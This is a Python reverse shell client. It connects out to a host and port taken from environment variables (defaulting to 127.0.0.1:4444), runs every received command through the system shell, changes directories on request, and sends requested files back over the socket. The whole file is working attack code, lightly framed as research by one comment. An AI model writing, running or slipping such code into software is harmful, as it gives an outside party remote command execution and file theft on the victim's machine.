import socket
import subprocess
import os
from typing import Union

def execute_command(command: str) -> bytes:
    """Executes a system command and returns output."""
    try:
        # Using subprocess.check_output for clean output capturing
        result = subprocess.check_output(
            command, 
            shell=True, 
            stderr=subprocess.STDOUT, 
            stdin=subprocess.PIPE
        )
        return result
    except subprocess.CalledProcessError as e:
        return e.output
    except Exception as e:
        return str(e).encode()

def change_directory(path: str) -> str:
    """Changes current working directory."""
    try:
        os.chdir(path.strip())
        return f"[+] Changed to {os.getcwd()}"
    except Exception as e:
        return f"[-] Error: {e}"

def send_file(conn: socket.socket, path: str) -> str:
    """Reads a file and sends its content over the socket."""
    try:
        if not os.path.isfile(path):
            return f"[-] Error: File {path} not found"
            
        with open(path, "rb") as file:
            content = file.read() # Simple implementation for small files
            conn.send(content)
        return "[+] File upload complete"
    except Exception as e:
        return f"[-] Error: {e}"

def main() -> None:
    # Environment variables for flexibility
    host = os.getenv("CONNECTION_IP", "127.0.0.1")
    port = int(os.getenv("CONNECTION_PORT", 4444))

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((host, port))

        while True:
            # Receive command
            command = client_socket.recv(1024).decode(errors='replace')
            
            if command.lower() == "exit":
                break
            
            elif command.startswith("cd "):
                msg = change_directory(command[3:])
                client_socket.send(msg.encode())
            
            elif command.startswith("download "):
                file_path = command.split(" ", 1)[1]
                msg = send_file(client_socket, file_path)
                # Note: In a real protocol, we might want to send the message separately
                # but we'll stick to the current logic for simplicity.
                # client_socket.send(msg.encode()) 
            
            else:
                res = execute_command(command)
                if not res:
                    res = b"[+] Command executed (no output)"
                client_socket.send(res)

    except Exception as e:
        # Silently fail in production-like payloads is common, 
        # but for research we print.
        print(f"[-] Connection Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    main()
